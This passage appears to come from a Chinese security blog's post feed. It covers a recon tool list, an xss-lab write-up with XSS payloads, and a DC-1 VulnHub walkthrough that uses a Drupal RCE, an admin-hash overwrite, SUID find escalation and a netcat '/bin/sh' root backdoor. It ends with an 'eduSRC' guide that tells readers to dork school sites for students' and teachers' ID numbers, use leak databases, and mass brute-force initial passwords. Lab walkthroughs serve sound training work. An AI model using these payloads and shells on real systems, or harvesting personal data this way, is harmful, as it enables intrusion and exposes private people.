title="网盘搜索"></a>网盘搜索</h3><p>凌云搜索：  <a href="https://www.lingfengyun.com/">https://www.lingfengyun.com/</a><br>盘多多： <a href="http://www.panduoduo.net/">http://www.panduoduo.net/</a><br>盘搜搜： <a href="http://www.pansoso.com/">http://www.pansoso.com/</a><br>盘搜： <a href="http://www.pansou.com/">http://www.pansou.com/</a></p><h3 id="社工库"><a href="#社工库" class="headerlink" title="社工库"></a>社工库</h3><p>名字/常用id/邮箱/密码/电话 登录 网盘 网站 邮箱 找敏感信息</p><p>tg机器人 大部分收费查询</p><h3 id="网站注册信息"><a href="#网站注册信息" class="headerlink" title="网站注册信息"></a>网站注册信息</h3><p>www.reg007.com 查询网站注册信息<br>一般是配合社工库一起来使用。</p><h2 id="js敏感信息"><a href="#js敏感信息" class="headerlink" title="js敏感信息"></a>js敏感信息</h2><ol><li>网站的url连接写到js里面</li><li>js的api接口 里面包含用户信息 比如 账号和密码</li></ol><h3 id="jsfinder"><a href="#jsfinder" class="headerlink" title="jsfinder"></a>jsfinder</h3><p><a href="https://gitee.com/kn1fes/JSFinder">https://gitee.com/kn1fes/JSFinder</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python3 JSFinder.py -u [http://www.mi.com](http://www.mi.com)</span><br><span class="line">python3 JSFinder.py -u http://www.mi.com -d</span><br><span class="line">python3 JSFinder.py -u http://www.mi.com -d -ou mi_url.txt -os mi_subdomain.txt</span><br></pre></td></tr></table></figure><p>当你想获取更多信息的时候，可以使用-d进行深度爬取来获得更多内容，并使用命令 -ou, -os来指定URL和子域名所保存的文件名</p><p>批量指定URL和JS链接来获取里面的URL。<br>指定URL：<br>python JSFinder.py -f text.txt<br>指定JS：<br>python JSFinder.py -f text.txt -j</p><h3 id="Packer-Fuzzer"><a href="#Packer-Fuzzer" class="headerlink" title="Packer-Fuzzer"></a>Packer-Fuzzer</h3><p>寻找网站交互接口 授权key</p><p>随着WEB前端打包工具的流行，您在日常渗透测试、安全服务中是否遇到越来越多以Webpack打包器为代表的网站？这类打包器会将整站的API和API参数打包在一起供Web集中调用，这也便于我们快速发现网站的功能和API清单，但往往这些打包器所生成的JS文件数量异常之多并且总JS代码量异常庞大（多达上万行），这给我们的手工测试带来了极大的不便，Packer Fuzzer软件应运而生。</p><p>本工具支持自动模糊提取对应目标站点的API以及API对应的参数内容，并支持对：未授权访问、敏感信息泄露、CORS、SQL注入、水平越权、弱口令、任意文件上传七大漏洞进行模糊高效的快速检测。在扫描结束之后，本工具还支持自动生成扫描报告，您可以选择便于分析的HTML版本以及较为正规的doc、pdf、txt版本。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install nodejs &amp;&amp; sudo apt-get install npm</span><br><span class="line">git clone https://gitee.com/keyboxdzd/Packer-Fuzzer.git</span><br><span class="line">pip3 install -r requirements.txt</span><br><span class="line">python3 PackerFuzzer.py -u https://www.liaoxuefeng.com</span><br></pre></td></tr></table></figure><h3 id="SecretFinder"><a href="#SecretFinder" class="headerlink" title="SecretFinder"></a>SecretFinder</h3><p>一款基于Python脚本的JavaScript敏感信息搜索工具</p><p><a href="https://gitee.com/mucn/SecretFinder">https://gitee.com/mucn/SecretFinder</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 SecretFinder.py -i https://www.moonsec.com/ -e</span><br></pre></td></tr></table></figure><h2 id="cms识别"><a href="#cms识别" class="headerlink" title="cms识别"></a>cms识别</h2><p>收集好网站信息之后，应该对网站进行指纹识别，通过识别指纹，确定目标的cms及版本，方便制定下一步的测试计划，可以用公开的poc或自己累积的对应手法等进行正式的渗透测试。</p><h3 id="在线cms识别"><a href="#在线cms识别" class="headerlink" title="在线cms识别"></a>在线cms识别</h3><p>云悉<br><a href="http://www.yunsee.cn/info.html">http://www.yunsee.cn/info.html</a><br>潮汐指纹<br><a href="http://finger.tidesec.net/">http://finger.tidesec.net/</a></p><p><a href="http://whatweb.bugscaner.com/look/">http://whatweb.bugscaner.com/look/</a><br><a href="https://github.com/search?q=cms识别">https://github.com/search?q=cms识别</a></p><h3 id="工具识别"><a href="#工具识别" class="headerlink" title="工具识别"></a>工具识别</h3><p>whatcms kali下<br>御剑cms识别<br><a href="https://github.com/ldbfpiaoran/cmscan">https://github.com/ldbfpiaoran/cmscan</a><br><a href="https://github.com/theLSA/cmsIdentification/">https://github.com/theLSA/cmsIdentification/</a></p><h2 id="非常规操作"><a href="#非常规操作" class="headerlink" title="非常规操作"></a>非常规操作</h2><p>1、如果找到了目标的一处资产，但是对目标其他资产的收集无处下手时，可以查看一下该站点的body里是否有目标的特征，然后利用网络空间搜索引擎（如fofa等）对该特征进行搜索，如：body=”XX公司”或body=”baidu”等。</p><p>该方式一般适用于特征明显，资产数量较多的目标，并且很多时候效果拔群。</p><p>2、当通过上述方式的找到test.com的特征后，再进行body的搜索，然后再搜索到test.com的时候，此时fofa上显示的ip大概率为test.com的真实IP。</p><p>3、如果需要对政府网站作为目标，那么在批量获取网站首页的时候，可以用上<br><a href="http://114.55.181.28/databaseInfo/index">http://114.55.181.28/databaseInfo/index</a></p><p>之后可以结合上一步的方法进行进一步的信息收集。</p><h2 id="移动资产收集"><a href="#移动资产收集" class="headerlink" title="移动资产收集"></a>移动资产收集</h2><h3 id="微信小程序支付宝小程序"><a href="#微信小程序支付宝小程序" class="headerlink" title="微信小程序支付宝小程序"></a>微信小程序支付宝小程序</h3><p>现在很多企业都有小程序，可以关注企业的微信公众号或者支付宝小程序，或关注运营相关人员，查看朋友圈，获取小程序。</p><p><a href="https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E6%8B%BC%E5%A4%9A%E5%A4%9A">https://weixin.sogou.com/weixin?type=1&amp;ie=utf8&amp;query=%E6%8B%BC%E5%A4%9A%E5%A4%9A</a></p><h3 id="app软件搜索"><a href="#app软件搜索" class="headerlink" title="app软件搜索"></a>app软件搜索</h3><p><a href="https://www.qimai.cn/">https://www.qimai.cn/</a></p><h2 id="资产收集神器"><a href="#资产收集神器" class="headerlink" title="资产收集神器"></a>资产收集神器</h2><p>ARL(Asset Reconnaissance Lighthouse)资产侦察灯塔系统<br><a href="https://github.com/TophantTechnology/ARL">https://github.com/TophantTechnology/ARL</a>]</p><p>AssetsHunter<br><a href="https://github.com/rabbitmask/AssetsHunter">https://github.com/rabbitmask/AssetsHunter</a></p><p>一款用于src资产信息收集的工具<br><a href="https://github.com/sp4rkw/Reaper">https://github.com/sp4rkw/Reaper</a></p><p>domain_hunter_pro<br><a href="https://github.com/bit4woo/domain_hunter_pro">https://github.com/bit4woo/domain_hunter_pro</a></p><p>LangSrcCurise<br><a href="https://github.com/shellsec/LangSrcCurise">https://github.com/shellsec/LangSrcCurise</a></p><p>网段资产<br><a href="https://github.com/colodoo/midscan">https://github.com/colodoo/midscan</a></p><h2 id="字典工具"><a href="#字典工具" class="headerlink" title="字典工具"></a>字典工具</h2><p>Fuzz字典推荐： <a href="https://github.com/TheKingOfDuck/fuzzDicts">https://github.com/TheKingOfDuck/fuzzDicts</a><br>BurpCollector(BurpSuite参数收集插件)： <a href="https://github.com/TEag1e/BurpCollector">https://github.com/TEag1e/BurpCollector</a><br>Wfuzz： <a href="https://github.com/xmendez/wfuzz">https://github.com/xmendez/wfuzz</a><br>LinkFinder： <a href="https://github.com/GerbenJavado/LinkFinder">https://github.com/GerbenJavado/LinkFinder</a><br>PoCBox： <a href="https://github.com/Acmesec/PoCBox">https://github.com/Acmesec/PoCBox</a></p>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>xss-lab通关小计</title>
      <link href="/posts/973d.html"/>
      <url>/posts/973d.html</url>
      
        <content type="html"><![CDATA[<h2 id="xss-lab通关小计"><a href="#xss-lab通关小计" class="headerlink" title="xss-lab通关小计"></a>xss-lab通关小计</h2><p>实际构造闭合，另外要对js有一定了解<br>常用测试语句：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(<span class="number">1</span>)&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(1)&gt;</span><br><span class="line">&lt;svg onload=alert(1)&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;</span><br></pre></td></tr></table></figure><h3 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1"></a>Level 1</h3><p><code>https://xssaq.com/yx/level1.php?name=test</code><br>name参数未过滤，参数值直接显示在页面中。  </p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h3 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2"></a>Level 2</h3><p>闭合input标签，构造<code>&lt;input name=&quot;keyword&quot; value=&quot;&quot;&gt;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;//&gt;</code></p><h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><p>value同2，但对部分特殊字符进行了转译，双引号被过滤了，后端使用了htmlspecialchars函数 <code>&lt;input name=&quot;keyword&quot; value=&quot;&amp;quot;&gt;&lt;script&gt;alert(&quot; xss&#39;)&amp;lt;=&quot;&quot; script&amp;gt;&#39;=&quot;&quot;&gt;</code></p><p>可以使用不带有尖括号的特殊字符进行尝试 如：’ onclick=’alert(1) （利用了HTML DOM 的onclick事件，点击后触发包含的命令）</p><h3 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4"></a>Level 4</h3><p>同3，也有过滤，双引号没被过滤，构造闭合<code>&quot; onclick=&quot;alert(1)</code></p><h3 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5"></a>Level 5</h3>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>DC-1靶机</title>
      <link href="/posts/5951.html"/>
      <url>/posts/5951.html</url>
      
        <content type="html"><![CDATA[<h1 id="DC-1靶机"><a href="#DC-1靶机" class="headerlink" title="DC-1靶机"></a>DC-1靶机</h1><h2 id="Download"><a href="#Download" class="headerlink" title="Download"></a>Download</h2><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.vulnhub.com/entry/dc-1,292/</span><br></pre></td></tr></table></figure><p>将网路模式改为net模式</p><h2 id="相关知识点"><a href="#相关知识点" class="headerlink" title="相关知识点"></a>相关知识点</h2><ul><li>nmap扫描网段与端口服务的探测</li><li>msfconsole使用</li><li>drupal cms漏洞利用</li><li>netcat反弹shell</li><li>mysql数据库渗透思路</li><li>suid提权</li></ul><hr><h2 id="基础信息收集"><a href="#基础信息收集" class="headerlink" title="基础信息收集"></a>基础信息收集</h2><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">主机发现</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -sn -n --min-rate 1000 192.168.101.0/24</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">arp-scan -l</span></span><br><span class="line">端口探测</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">ports=$(nmap -p- -sS -n --min-rate=1000 -T4 192.168.101.132 | grep ^[0-9] | <span class="built_in">cut</span> -d <span class="string">&#x27;/&#x27;</span> -f 1 | <span class="built_in">tr</span> <span class="string">&#x27;\n&#x27;</span> <span class="string">&#x27;,&#x27;</span> | sed s/,$//)</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">nmap -sV -n -p<span class="variable">$ports</span> -T4 -A 192.168.101.132 -oN nmap.txt</span></span><br></pre></td></tr></table></figure><p>发现22、80、111端口，尝试shh爆破(nmap也能爆破)</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/**rockyou**.txt -f -o hydra.txt -u</span></span><br></pre></td></tr></table></figure><p>发现ssh爆破失败，尝试80端口的web服务<br>网站就一登录页面，注册账户发现不能设置密码，提示拿到admin用户的权限，扫cms。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wahtweb http://192.168.101.132</span></span><br></pre></td></tr></table></figure><p>发现其cms为drupal，尝试drupal漏洞利用</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">searchsploit drupal</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">searchsploit -m php/webapps/xxxxx.rb</span></span><br></pre></td></tr></table></figure><p>发现drupal cms存在远程代码执行漏洞，尝试利用，成功获取webshell</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">whomai</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">www-data</span></span><br></pre></td></tr></table></figure><p>开交互shell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure><p>发现有漏洞也可以直接用msf<br>使用2018年的漏洞吧，是个远程代码执行(代码审计现在真心看不懂，😔)<br><a href="https://www.exploit-db.com/exploits/44482">https://www.exploit-db.com/exploits/44482</a><br><a href="https://paper.seebug.org/567/">https://paper.seebug.org/567/</a></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// file: \core\lib\Drupal\Core\Render\Renderer.php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$elements</span>[<span class="string">&#x27;#pre_render&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$elements</span>[<span class="string">&#x27;#pre_render&#x27;</span>] <span class="keyword">as</span> <span class="variable">$callable</span>) &#123;</span><br><span class="line">      <span class="keyword">if</span> (<span class="title function_ invoke__">is_string</span>(<span class="variable">$callable</span>) &amp;&amp; <span class="title function_ invoke__">strpos</span>(<span class="variable">$callable</span>, <span class="string">&#x27;::&#x27;</span>) === <span class="literal">FALSE</span>) &#123;</span><br><span class="line">        <span class="variable">$callable</span> = <span class="variable language_">$this</span>-&gt;controllerResolver-&gt;<span class="title function_ invoke__">getControllerFromDefinition</span>(<span class="variable">$callable</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="variable">$elements</span> = <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$callable</span>, <span class="variable">$elements</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="数据库攻击"><a href="#数据库攻击" class="headerlink" title="数据库攻击"></a>数据库攻击</h1><p>当前目录下找到flag1，/home/flag4下发现flag4，flag1提示去看drupal默认配置文件，查看默认配置文件发现mysql敏感信息</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$databases = array (</span><br><span class="line">  &#x27;default&#x27; =&gt;</span><br><span class="line">  array (</span><br><span class="line">    &#x27;default&#x27; =&gt;</span><br><span class="line">    array (</span><br><span class="line">      &#x27;database&#x27; =&gt; &#x27;drupaldb&#x27;,</span><br><span class="line">      &#x27;username&#x27; =&gt; &#x27;dbuser&#x27;,</span><br><span class="line">      &#x27;password&#x27; =&gt; &#x27;R0ck3t&#x27;,</span><br><span class="line">      &#x27;host&#x27; =&gt; &#x27;localhost&#x27;,</span><br><span class="line">      &#x27;port&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">      &#x27;driver&#x27; =&gt; &#x27;mysql&#x27;,</span><br><span class="line">      &#x27;prefix&#x27; =&gt; &#x27;&#x27;,</span><br><span class="line">    ),</span><br><span class="line">  ),</span><br><span class="line">);</span><br></pre></td></tr></table></figure><p>这边看到了flag2<br>登录mysql数据库，查看数据库信息，查看一下node和user表，发现flag3，uid为1，说明要admin权限。发现admin账户pass经过hash加密，hash加密算法不可知。<br>这边有两个思路，一个是我们注册一个账号将二者hash互换，但是注册时无法写密码，第二个便是我们找到加密脚本，将我们的密码加密后写入数据库。发现加密脚本位置scripts/password-hash.sh<br>这里为什么要看node表呢？？？(user表就不说了吧)<br>因为<a href="https://www.cnblogs.com/amw863/p/4551889.html">drupal node机制理解</a></p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">php scripts/password-hash.sh admin</span><br><span class="line">password: admin          hash: $S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.</span><br></pre></td></tr></table></figure><p>更换管理员密码的hash。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> users <span class="keyword">set</span> pass<span class="operator">=</span><span class="string">&#x27;$S$DyyA5HnUonyq8xJJZeWKGIsIxaDpzGM6jbKqPiERZ/lLMnsWkUB.&#x27;</span> <span class="keyword">where</span> name<span class="operator">=</span><span class="string">&#x27;admin&#x27;</span>;</span><br></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>登录admin账户后拿到flag3。<br>Special PERMS will help FIND the passwd - but you’ll need to -exec that command to work out how to get what’s in the shadow.<br>FIND，-exec提示很明显了，find提权。flag4也提示我们要提权到root。</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">不同系统适用于不同的命令</span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -user root -perm -4000-print2&gt;/dev/null</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">find / -user root -perm -4000-<span class="built_in">exec</span> <span class="built_in">ls</span> -ldb &#123;&#125; \;</span></span><br></pre></td></tr></table></figure><p>尝试查看find是否有suid权限</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find /tmp -exec whoami  \;</span><br></pre></td></tr></table></figure><p>find 命令说明<br>-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以前面加反斜杠。-exec参数后面跟的就是我们想进一步操作的命令,so，我们可以以root的权限命令执行了。<br>留一个root的netcat的后门</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">find /tmp -exec netcat -lvp 4444 -e &quot;/bin/sh&quot; \;</span><br><span class="line">nc 192.168.124.145 4444</span><br></pre></td></tr></table></figure><p>拿到最后一个flag。</p><p>Well done!!!!</p><p>Hopefully you’ve enjoyed this and learned some new skills.</p><p>You can let me know what you thought of this little journey\<br>by contacting me via Twitter - @DCAU7</p>]]></content>
      
      
      <categories>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DC系列靶机 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>src渗透测试小计</title>
      <link href="/posts/4232.html"/>
      <url>/posts/4232.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、信息收集篇"><a href="#一、信息收集篇" class="headerlink" title="一、信息收集篇"></a>一、信息收集篇</h1><h2 id="企业SRC"><a href="#企业SRC" class="headerlink" title="企业SRC"></a>企业SRC</h2><p>通过爱企查，查找对方公司的域名，小程序，APP之类的，一般专属src都有可测资产范围。然后使用360quake，OneForAll，鹰图进行子域名查询等等。</p><h2 id="eduSRC"><a href="#eduSRC" class="headerlink" title="eduSRC"></a>eduSRC</h2><p>对于我们在挖edusrc的时候遇见最大的问题就是如何突破一站式服务大厅的网站，要突破这一点，我们就需要拥有教师的工号、身份证和 学生的身份证、 学号这些个人隐私信息，所以我们就需要做好信息收集：</p><ol><li><p>利用好谷歌语法查找敏感信息：<br> site:xxx.edu.cn  这个语句是寻找这个学校的相关域名的站点，但是在这个后面加一些敏感信息就可以指定查找了，比如：<br> <code>site:xxx.edu.cn  身份证      site:xxx.edu.cn  学号</code><br> 一般直接可以从奖学金审批表、录取名单等获取很多信息，一般隐私信息都会以doc pdf xls 这些文件发布到网上，所以造成信息泄露（如果你不追求什么漏洞，上上rank 这一个都够你上几百rank  就谷歌搜：site:.edu.cn  sfz   filetype: pdf|xls|doc 即可。  如果以上没有找到自己想要的信息，你就可以去找所在学校相关的教育局站点，因为助学金等奖励都会通过当地教育局进行展开，这样在相关教育局站点我们也可以收集到我们需要的信息。</p></li><li><p>利用谷歌语法查找脆弱的系统获取信息：<br> 利用谷歌语法查找脆弱的系统获取信息：  site:xxx.edu.cn  初始密码 利用上面的语法可以查找许多相关弱口令系统，然后利用上面收集的信息，进行登录，从这些能登录进去的系统，我们也可以获取很多有用的信息，在进一步说，至少我们有学生权限的账号了，可以测试水平或者垂直漏洞，毕竟后台漏洞是要比前台多：</p></li></ol><p>然后利用我们收集的信息大量尝试登录即可，如果二者缺一可以思考如何获取，这一点自己思考：<br>然后再利用我们的初始密码去大量爆破弱口令用户：</p><p>利用fofa找一些与edu有关的系统<br>语法：“系统” &amp;&amp; org=“China Education and Research Network Center”</p><h2 id="httpx"><a href="#httpx" class="headerlink" title="httpx"></a>httpx</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line">### Usage</span><br><span class="line"></span><br><span class="line">- httpx -h</span><br><span class="line"></span><br><span class="line">#### 基本</span><br><span class="line"></span><br><span class="line">- -l，-list 域名列表</span><br><span class="line">- -request raw 文件</span><br><span class="line">- -slient 简洁模式</span><br><span class="line"></span><br><span class="line">#### 探测</span><br><span class="line"></span><br><span class="line">- -sc， -status-code 显示 Status Code</span><br><span class="line"></span><br><span class="line">- -td, -tech-detect 显示基于 wappalyzer 的探测网站指纹</span><br><span class="line">- -cl -content-lenght 显示 Content-Length</span><br><span class="line">- -server，-web-server 显示 Server 头</span><br><span class="line">- -ct -conten-type 显示 Content-Type 头</span><br><span class="line">- -rt， -respond-time 显示服务器响应时间</span><br><span class="line">- -title 显示网站标题</span><br><span class="line">- -location 显示重定向 Location 头</span><br><span class="line">- -method 显示请求方式</span><br><span class="line">- -websocket 显示服务使用的 websocket</span><br><span class="line">- -ip 显示主机 IP</span><br><span class="line">- -cname 显示主机 cname</span><br><span class="line">- -cnd 显示使用的 CND</span><br><span class="line">- -probe 显示探测状态</span><br><span class="line"></span><br><span class="line">#### 匹配 MATCHERS:</span><br><span class="line"></span><br><span class="line">- -mc, -match-code 匹配 Respone 返回相关的状态码 (-mc 200,302)</span><br><span class="line">- -ml, -match-length 匹配 Respone 返回相关的正文长度(-ml 100,102)</span><br><span class="line">- -ms, -match-string 匹配 Respone 返回相关的字符</span><br><span class="line">- -mr, -match-regex string 正则匹配 Respone</span><br><span class="line">- -er, -extract-regex string 显示与正则表达式匹配的响应内容</span><br><span class="line"></span><br><span class="line">#### 过滤 FILTERS:</span><br><span class="line"></span><br><span class="line">- -fc, -filter-code string 过滤状态码 (-fc 403,401)</span><br><span class="line">- -fl, -filter-length string 过滤返回长度(-fl 23,33)</span><br><span class="line">- -fs, -filter-string string 过滤响应字符</span><br><span class="line">- -fe, -filter-regex string 正则过滤响应字符</span><br><span class="line"></span><br><span class="line">#### 速率</span><br><span class="line"></span><br><span class="line">- -t,-threads 线程数，默认 50</span><br><span class="line">- -rl, -rate-limit 每秒最大请求速，默认 150</span><br><span class="line"></span><br><span class="line">#### 输出</span><br><span class="line"></span><br><span class="line">- -o, -output string 保存探测结果</span><br><span class="line">- -sr, -store-response 保存返回内容</span><br><span class="line">- -srd, -store-response-dir string Custom directory to store HTTP responses (default “output”)</span><br><span class="line">- -json 保存至 JSON 格式</span><br><span class="line">- -irr, -include-response 在 JSON 输出中包含 HTTP 请求/响应（仅限-JSON）</span><br><span class="line">- -include-chain 在 JSON 输出中重定向 HTTP 链（仅限-JSON）</span><br><span class="line">- -store-chain 在响应中包含 HTTP 重定向链（仅限-sr）</span><br><span class="line">- -csv 保存为 CSV</span><br><span class="line"></span><br><span class="line">#### 配置</span><br><span class="line"></span><br><span class="line">- -allow string[] 允许的 IP / CIDR 列表</span><br><span class="line">- -deny string[] 拒绝的 IP / CIDR 列表</span><br><span class="line">- -random-agent Random User-Agent(default true)</span><br><span class="line">- -H, -header string[] 自定义请求头</span><br><span class="line">- -http-proxy, -proxy string HTTP Proxy, eg http://127.0.0.1:8080</span><br><span class="line">- -unsafe Send raw requests skipping golang normalization</span><br><span class="line">- -resume Resume scan using resume.cfg</span><br><span class="line">- -fr, -follow-redirects 跟随重定向</span><br><span class="line">- -maxr, -max-redirects int 最大重定向的跟随数量（默认 10）</span><br><span class="line">- -fhr, -follow-host-redirects Follow redirects on the same host</span><br><span class="line">- -vhost-input Get a list of vhosts as input</span><br><span class="line">- -x string 请求方式，使用“all” 为探测所有 HTTP 方法</span><br><span class="line">- -body string Post body</span><br><span class="line">- -s, -stream Stream mode - start elaborating input targets without sorting</span><br><span class="line">- -sd, -skip-dedupe Disable dedupe input items (only used with stream mode)</span><br><span class="line">- -pa, -probe-all-ips Probe all the ips associated with same host</span><br><span class="line"></span><br><span class="line">#### 其他</span><br><span class="line"></span><br><span class="line">- -tls-grab Perform TLS(SSL) data grabbing</span><br><span class="line">- -tls-probe Send HTTP probes on the extracted TLS domains</span><br><span class="line">- -csp-probe Send HTTP probes on the extracted CSP domains</span><br><span class="line">- -pipeline HTTP1.1 Pipeline probe</span><br><span class="line">- -http2 HTTP2 probe</span><br><span class="line">- -vhost VHOST Probe</span><br><span class="line">- -p, -ports string[] Port to scan (nmap syntax: eg 1,2-10,11)</span><br><span class="line">- -path string File or comma separated paths to request</span><br><span class="line">- -paths string File or comma separated paths to request (deprecated)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
